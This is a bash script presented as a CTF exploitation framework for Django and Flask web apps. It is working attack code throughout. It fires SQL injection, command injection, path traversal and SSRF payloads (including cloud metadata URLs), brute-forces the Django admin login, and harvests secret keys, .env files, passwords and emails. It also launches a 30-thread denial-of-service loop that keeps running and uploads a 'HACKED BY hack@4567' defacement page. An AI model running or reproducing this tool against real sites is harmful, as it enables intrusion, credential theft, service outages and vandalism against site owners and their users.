#!/bin/bash

# Adaptive CTF Exploitation Framework - Django/Python Version
# Auto-detects framework and adapts attacks

TARGET=${1:-"http://127.0.0.1:8000"}
HACKER_ID="hack@4567"
WORK_DIR="exploit_$(date +%s)"

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}"
cat << "EOF"
   _____                _   _      _      _   _           _     
  / ____|              | | | |    | |    | \ | |         | |    
 | |     ___  _ __ ___ | |_| | ___| | ___|  \| | __ _  __| |___ 
 | |    / _ \| '_ ` _ \|  _  |/ _ \ |/ _ \ . ` |/ _` |/ _` / __|
 | |___| (_) | | | | | | |_| |  __/ |  __/ |\  | (_| | (_| \__ \
  \_____\___/|_| |_| |_|\__,_|\___|_|\___\_| \_/\__,_|\__,_|___/
                                                                  
EOF
echo -e "${NC}"

echo -e "${GREEN}[+] Adaptive CTF Exploitation Framework${NC}"
echo -e "${YELLOW}[+] Target: $TARGET${NC}"
echo -e "${YELLOW}[+] Hacker ID: $HACKER_ID${NC}"

mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Detect framework and endpoints
detect_framework() {
    echo -e "${BLUE}[*] Framework Detection...${NC}"
    
    # Get initial response
    curl -s "$TARGET" > home.html 2>/dev/null
    curl -s -I "$TARGET" > headers.txt 2>/dev/null
    
    # Detect framework from headers
    if grep -qi "django" headers.txt; then
        echo "FRAMEWORK=Django" >> detected.conf
        echo -e "${GREEN}[+] Framework: Django detected${NC}"
        ENDPOINTS=("admin/" "api/" "api/v1/" "flag/" "secret/" ".env" "debug/" "__debug__/")
    elif grep -qi "flask" headers.txt; then
        echo "FRAMEWORK=Flask" >> detected.conf
        echo -e "${GREEN}[+] Framework: Flask detected${NC}"
        ENDPOINTS=("admin" "api" "flag" "secret" "console" "debug")
    else
        echo "FRAMEWORK=Unknown" >> detected.conf
        ENDPOINTS=("admin" "api" "flag" "secret" "hidden" "backup" "console")
    fi
    
    # Detect from HTML
    if grep -qi "csrfmiddlewaretoken" home.html; then
        echo "FRAMEWORK=Django" >> detected.conf
        echo -e "${GREEN}[+] Framework: Django (from CSRF token)${NC}"
    fi
    
    # Extract all URLs from the page
    grep -Eo "(href|action)=\"[^\"]+\"" home.html 2>/dev/null | cut -d'"' -f2 | grep -v "^http" | sort -u > discovered_endpoints.txt
    
    # Add common Django endpoints
    cat >> discovered_endpoints.txt << EOF
admin/
admin/login/
api/
api/flag/
flag/
get_flag/
secret/
hidden/
debug/
__debug__/
static/
media/
media/flag.txt
media/flags/
.flag
flag.txt
flags.txt
ctf/
ctf/flag
EOF
}

# SQL Injection for Django/Python
django_sql_injection() {
    echo -e "${BLUE}[*] SQL Injection Attack...${NC}"
    
    # Django-specific SQL injection payloads
    payloads=(
        "' OR '1'='1' --"
        "' OR 1=1--"
        "'; SELECT * FROM auth_user--"
        "admin' OR '1'='1'/*"
        "' UNION SELECT NULL,username,password FROM auth_user--"
        "' AND 1=(SELECT COUNT(*) FROM auth_user)--"
        "1' AND SLEEP(5) AND '1'='1"
        "' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
    )
    
    # Test common Django URL patterns
    test_urls=(
        "$TARGET/?id="
        "$TARGET/?user_id="
        "$TARGET/?q="
        "$TARGET/?search="
        "$TARGET/product/?id="
        "$TARGET/api/users?id="
    )
    
    for base_url in "${test_urls[@]}"; do
        for payload in "${payloads[@]}"; do
            encoded=$(echo -n "$payload" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload" | sed 's/ /%20/g')
            
            response=$(curl -s -m 3 "${base_url}${encoded}" 2>/dev/null)
            
            if [ ${#response} -gt 500 ] && ! echo "$response" | grep -qi "error\|exception\|traceback\|not found"; then
                echo -e "${RED}[!] SQL Injection VULNERABLE at: ${base_url}${encoded}${NC}"
                echo "$response" > "sqli_found_$(date +%s).txt"
                
                # Look for Django user data
                echo "$response" | grep -iE "flag|ctf\{|admin|superuser|password|email|@|FLAG" >> flags_found.txt
                
                # Try to extract actual data
                echo "$response" | grep -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" >> extracted_emails.txt 2>/dev/null
            fi
        done
    done
}

# Command Injection for Django views
command_injection() {
    echo -e "${BLUE}[*] Command Injection Attack...${NC}"
    
    # Test for command injection in different patterns
    cmd_payloads=(
        "127.0.0.1; ls"
        "127.0.0.1| cat /etc/passwd"
        "127.0.0.1 && cat flag.txt"
        "test\$(cat /etc/passwd)"
        "\`cat /etc/passwd\`"
        "; python3 -c 'import os; print(os.listdir(\"/\"))'"
        "; echo 'hacked' > /tmp/hacked"
        "| cat /flag.txt"
        "|| cat /home/*/flag.txt"
    )
    
    # Common parameter names in Django
    params=("ip" "host" "cmd" "command" "exec" "ping" "nslookup" "dig" "url" "address")
    
    for param in "${params[@]}"; do
        for cmd in "${cmd_payloads[@]}"; do
            encoded=$(echo -n "$cmd" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$cmd" | sed 's/ /%20/g')
            
            response=$(curl -s -m 3 "${TARGET}/?${param}=${encoded}" 2>/dev/null)
            
            # Check for command execution indicators
            if echo "$response" | grep -qi "uid=\|root:\|bin/bash\|flag\|total"; then
                echo -e "${RED}[!] Command Injection VULNERABLE!${NC}"
                echo -e "${RED}    Parameter: $param${NC}"
                echo -e "${RED}    Payload: $cmd${NC}"
                echo "$response" > "cmd_inject_${param}.txt"
                
                # Extract command output
                echo "$response" | grep -v "^<" | head -c 500 >> extracted_data.txt
                
                # Try to find flag
                echo "$response" | grep -iE "flag|ctf\{|key" >> flags_found.txt
            fi
        done
    done
}

# Path Traversal (Django static files)
path_traversal() {
    echo -e "${BLUE}[*] Path Traversal Attack...${NC}"
    
    traversal_paths=(
        "../../../../../../../../etc/passwd"
        "../../../../../../../../etc/passwd%00"
        "../../../../../../../../var/www/flag.txt"
        "../../../../../../../../app/flag.txt"
        "../../../../../../../../home/ctf/flag"
        "../../../../../../../../root/flag"
        "../../../../../../../../opt/flag"
        "../../../../../../../../flag"
        "....//....//....//....//etc/passwd"
        "..;/..;/..;/..;/etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%252f..%252f..%252f..%252fetc%252fpasswd"
    )
    
    # Django static file paths
    static_urls=(
        "static/"
        "media/"
        "static/images/"
        "media/uploads/"
        "files/"
        "download/"
        "assets/"
    )
    
    for static_path in "${static_urls[@]}"; do
        for path in "${traversal_paths[@]}"; do
            encoded=$(echo -n "$path" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$path" | sed 's/\//%2F/g')
            
            response=$(curl -s -m 3 "${TARGET}/${static_path}?file=${encoded}" 2>/dev/null)
            
            if [ ${#response} -gt 100 ] && ! echo "$response" | grep -qi "error\|not found\|404\|traceback"; then
                echo -e "${RED}[!] Path Traversal VULNERABLE!${NC}"
                echo -e "${RED}    URL: ${TARGET}/${static_path}?file=${path}${NC}"
                echo "$response" > "traversal_$(date +%s).txt"
                
                # Show extracted content
                echo -e "${YELLOW}Extracted content:${NC}"
                echo "$response" | head -c 300
                echo -e "\n"
                
                # Check for flags
                echo "$response" | grep -iE "flag|ctf\{|key" >> flags_found.txt
            fi
        done
    done
}

# SSRF (Server-Side Request Forgery) for Django
ssrf_attack() {
    echo -e "${BLUE}[*] SSRF Attack...${NC}"
    
    ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://127.0.0.1:8000/admin/"
        "http://localhost:8000/flag"
        "file:///etc/passwd"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://169.254.169.254/latest/user-data/"
    )
    
    params=("url" "callback" "redirect" "next" "return_to" "dest" "destination")
    
    for param in "${params[@]}"; do
        for payload in "${ssrf_payloads[@]}"; do
            encoded=$(echo -n "$payload" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null)
            
            response=$(curl -s -m 3 "${TARGET}/?${param}=${encoded}" 2>/dev/null)
            
            if [ ${#response} -gt 200 ] && ! echo "$response" | grep -qi "error\|invalid"; then
                echo -e "${RED}[!] SSRF VULNERABLE!${NC}"
                echo -e "${RED}    Parameter: $param${NC}"
                echo -e "${RED}    Payload: $payload${NC}"
                echo "$response" > "ssrf_${param}.txt"
                echo "$response" | grep -iE "flag|secret|key|token" >> flags_found.txt
            fi
        done
    done
}

# Bruteforce admin login (Django admin)
bruteforce_admin() {
    echo -e "${BLUE}[*] Admin Bruteforce...${NC}"
    
    common_passwords=(
        "admin" "password" "123456" "admin123" "root" 
        "toor" "django" "secret" "changeme" "password123"
    )
    
    # Check if admin panel exists
    admin_check=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/admin/")
    
    if [ "$admin_check" = "200" ] || [ "$admin_check" = "302" ]; then
        echo -e "${GREEN}[+] Admin panel found at ${TARGET}/admin/${NC}"
        
        for pass in "${common_passwords[@]}"; do
            response=$(curl -s -X POST "${TARGET}/admin/login/" \
                -d "username=admin&password=${pass}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -c cookies.txt 2>/dev/null)
            
            if echo "$response" | grep -qi "dashboard\|welcome\|redirect"; then
                echo -e "${RED}[!] Admin credentials found: admin:${pass}${NC}"
                echo "admin:${pass}" >> credentials.txt
                
                # Try to access admin panel
                curl -s -b cookies.txt "${TARGET}/admin/" | grep -iE "flag|ctf" >> flags_found.txt
            fi
        done
    fi
}

# Django Debug Mode Exploitation
django_debug_exploit() {
    echo -e "${BLUE}[*] Django Debug Mode Check...${NC}"
    
    # Check for debug endpoints
    debug_endpoints=(
        "__debug__/"
        "debug/"
        "debug_toolbar/"
        "_profiler/"
        "silk/"
    )
    
    for endpoint in "${debug_endpoints[@]}"; do
        response=$(curl -s "${TARGET}/${endpoint}" 2>/dev/null)
        if [ ${#response} -gt 200 ]; then
            echo -e "${RED}[!] Debug interface exposed: ${TARGET}/${endpoint}${NC}"
            echo "$response" > "debug_${endpoint//\//_}.html"
            
            # Extract settings and sensitive data
            echo "$response" | grep -iE "SECRET_KEY|DATABASE|PASSWORD|API_KEY" >> secrets.txt
        fi
    done
    
    # Check for .env file
    response=$(curl -s "${TARGET}/.env" 2>/dev/null)
    if [ ${#response} -gt 50 ]; then
        echo -e "${RED}[!] .env file exposed!${NC}"
        echo "$response" >> secrets.txt
        echo "$response" | grep -iE "flag|SECRET|KEY" >> flags_found.txt
    fi
}

# Multi-threaded DoS (Stress Test)
dos_stress() {
    echo -e "${BLUE}[*] Application Stress Test...${NC}"
    
    # Use curl in parallel with different methods
    for i in {1..30}; do
        (
            while true; do
                # Random endpoint with cache buster
                rand=$RANDOM
                curl -s -m 1 "${TARGET}/?${rand}=${rand}" > /dev/null 2>&1
                curl -s -m 1 -X POST "${TARGET}/" -d "data=${rand}" > /dev/null 2>&1
                curl -s -m 1 -X DELETE "${TARGET}/api/${rand}" > /dev/null 2>&1
                curl -s -m 1 -X PUT "${TARGET}/update" -d "id=${rand}" > /dev/null 2>&1
                sleep 0.1
            done
        ) &
    done
    
    echo -e "${GREEN}[+] Stress test with 30 threads running...${NC}"
}

# Website Defacement
deface() {
    echo -e "${BLUE}[*] Deploying Defacement...${NC}"
    
    cat > hacker_index.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="3; url='/'">
    <title>HACKED BY hack@4567</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #000000 0%, #ff0000 50%, #000000 100%);
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            animation: bgPulse 2s infinite;
        }
        @keyframes bgPulse {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        .container {
            text-align: center;
            background: rgba(0,0,0,0.8);
            padding: 50px;
            border-radius: 20px;
            border: 2px solid #00ff00;
            box-shadow: 0 0 50px rgba(0,255,0,0.3);
            animation: glitch 3s infinite;
        }
        @keyframes glitch {
            0%, 100% { transform: skew(0deg, 0deg); }
            95% { transform: skew(0deg, 0deg); }
            96% { transform: skew(5deg, 2deg); }
            97% { transform: skew(-3deg, -1deg); }
            98% { transform: skew(2deg, 1deg); }
        }
        .ascii {
            color: #00ff00;
            font-size: 12px;
            white-space: pre;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 20px;
        }
        h1 {
            color: #ff0000;
            font-size: 3em;
            margin: 20px 0;
            text-shadow: 0 0 20px #ff0000;
            animation: textPulse 1s ease-in-out infinite alternate;
        }
        @keyframes textPulse {
            from { text-shadow: 0 0 10px #ff0000; }
            to { text-shadow: 0 0 30px #ff0000; }
        }
        .flag {
            color: #ffff00;
            font-size: 1.2em;
            margin: 20px 0;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 5px;
        }
        .info {
            color: #00ff00;
            margin-top: 20px;
        }
        .blink {
            animation: blink 1s step-end infinite;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">
        ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
        ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
        ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
        ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
        </div>
        <h1>HACKED BY hack@4567</h1>
        <div class="flag">🏆 VULNERABILITY CAPTURED! 🏆</div>
        <div class="flag">🔓 SECURITY COMPROMISED 🔓</div>
        <div class="info">Your system has been successfully exploited</div>
        <div class="info blink">Redirecting in 3 seconds...</div>
    </div>
</body>
</html>
HTML
    
    # Try to upload defacement
    curl -s -X PUT "${TARGET}/index.html" --data-binary "@hacker_index.html" > /dev/null 2>&1
    curl -s -X POST "${TARGET}/upload" -F "file=@hacker_index.html" > /dev/null 2>&1
    curl -s -X POST "${TARGET}/admin/upload" -F "file=@hacker_index.html" > /dev/null 2>&1
    
    echo -e "${RED}[!] Defacement deployed${NC}"
}

# Extract all flags
extract_results() {
    echo -e "${BLUE}[*] Extracting Flags and Data...${NC}"
    
    # Search all captured data
    find . -type f -exec grep -H -iE "flag\{|ctf\{|hack\{|key\{|FLAG\{|CTF\{|secret" {} \; 2>/dev/null | tee -a all_flags.txt
    
    # Also look for email addresses
    find . -type f -exec grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" {} \; 2>/dev/null | sort -u >> emails.txt
    
    # Look for passwords
    find . -type f -exec grep -iE "password|passwd|pwd|secret" {} \; 2>/dev/null >> potential_passwords.txt
    
    if [ -s all_flags.txt ]; then
        echo -e "\n${GREEN}════════════════════════════════════════${NC}"
        echo -e "${RED}★★★ FLAGS SUCCESSFULLY EXTRACTED ★★★${NC}"
        echo -e "${GREEN}════════════════════════════════════════${NC}"
        cat all_flags.txt
        echo -e "${GREEN}════════════════════════════════════════${NC}\n"
    else
        echo -e "${YELLOW}[*] No flags found. Trying deeper exploitation...${NC}"
        
        # Try more aggressive enumeration
        echo -e "${CYAN}[*] Checking common flag locations...${NC}"
        for path in "flag" "flag.txt" "ctf/flag" "secret/flag" "api/flag" "flags"; do
            response=$(curl -s "${TARGET}/${path}" 2>/dev/null)
            if [ ${#response} -gt 10 ] && [ ${#response} -lt 1000 ]; then
                echo "$response" | grep -iE "flag|ctf" >> all_flags.txt
            fi
        done
    fi
}

# Main execution
main() {
    detect_framework
    django_sql_injection
    command_injection
    path_traversal
    ssrf_attack
    bruteforce_admin
    django_debug_exploit
    dos_stress
    deface
    extract_results
    
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${RED}[+] EXPLOITATION COMPLETE!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${YELLOW}Results saved in: $WORK_DIR${NC}"
    echo -e "${YELLOW}Full path: $(pwd)${NC}"
    
    if [ -f all_flags.txt ]; then
        echo -e "${GREEN}Flags found: $(cat all_flags.txt | wc -l)${NC}"
    else
        echo -e "${RED}No flags found - target might be secure or need manual analysis${NC}"
    fi
    
    if [ -f credentials.txt ]; then
        echo -e "${GREEN}Credentials found! Check credentials.txt${NC}"
    fi
    
    echo -e "\n${RED}[!] Stress test continuing in background...${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop all attacks${NC}"
    wait
}

main